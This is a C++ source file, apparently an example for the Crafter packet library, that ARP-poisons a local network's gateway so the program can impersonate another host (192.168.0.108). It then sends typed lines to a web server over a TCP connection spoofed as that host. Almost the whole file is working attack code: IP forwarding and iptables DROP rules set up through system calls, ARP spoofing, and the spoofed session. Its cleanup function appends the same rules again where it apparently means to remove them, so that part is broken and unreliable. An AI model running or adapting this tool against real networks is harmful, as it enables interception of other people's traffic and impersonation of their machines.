#include <iostream>
#include <string>
#include <crafter.h>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

/*
 * This function add iptables roules to redirect all the traffic between the victim and the server
 * except the packets of the "spoofed" connection
 */
void start_forward(const string& dst_ip, const string& src_ip, int dst_port, int src_port);

void clear_forward(const string& dst_ip, const string& src_ip, int dst_port, int src_port);

int main() {
	/* Set the interface */
	string iface = "wlan0";

	/* Set connection data */
	string dst_ip = "www.google.com.ar";  // <-- Destination IP
	string src_ip = "192.168.0.108";    // <-- Spoof IP (not our IP address)
	short_word srcport = RNG16();     // <-- Some Random source port
	short_word dstport = 80;        // <-- Destination Port

	start_forward(dst_ip, src_ip, dstport, srcport);

	/* Begin the spoofing */
	ARPContext* arp_context = ARPSpoofingReply("192.168.0.1",src_ip,iface);

	/* Print some info */
	PrintARPContext(*arp_context);

	/* Give a few seconds to the poisoner */
	sleep(2);

	/* Initialize connection */
	TCPConnection tcp_connection(src_ip,dst_ip,srcport,dstport,iface);

	/* Establish a connection */
	tcp_connection.Sync();

	/* Send lines from standard input */
	string line = "";
	string centinel = "QUITCONSOLE";
	while(line != centinel) {
		/* Get a line from standard input */
		getline(cin,line);
		/* Send to the destination */
		if(line != centinel) {
			line += "\n";
			tcp_connection.Send(line.c_str());
		}
	}

	tcp_connection.Close();

	/* Clear everything */
	clear_forward(dst_ip, src_ip, dstport, srcport);
	CleanARPContext(arp_context);

	return 0;
}

void start_forward(const string& dst_ip, const string& src_ip, int dst_port, int src_port) {
    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");

	/* Drop packets received from the spoofed connection */

	system(string("/sbin/iptables -A FORWARD -s " + dst_ip + " -d " + src_ip +
			      " -p tcp --sport " + StrPort(dst_port) + " --dport " + StrPort(src_port) +
			      " -j DROP").c_str());

	system(string("/sbin/iptables -A FORWARD -s " + src_ip + " -d " + dst_ip +
			      " -p tcp --sport " + StrPort(src_port) + " --dport " + StrPort(dst_port) +
			      " -j DROP").c_str());

}

void clear_forward(const string& dst_ip, const string& src_ip, int dst_port, int src_port) {
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");

	system(string("/sbin/iptables -A FORWARD -s " + dst_ip + " -d " + src_ip +
			      " -p tcp --sport " + StrPort(dst_port) + " --dport " + StrPort(src_port) +
			      " -j DROP").c_str());

	system(string("/sbin/iptables -A FORWARD -s " + src_ip + " -d " + dst_ip +
			      " -p tcp --sport " + StrPort(src_port) + " --dport " + StrPort(dst_port) +
			      " -j DROP").c_str());
}
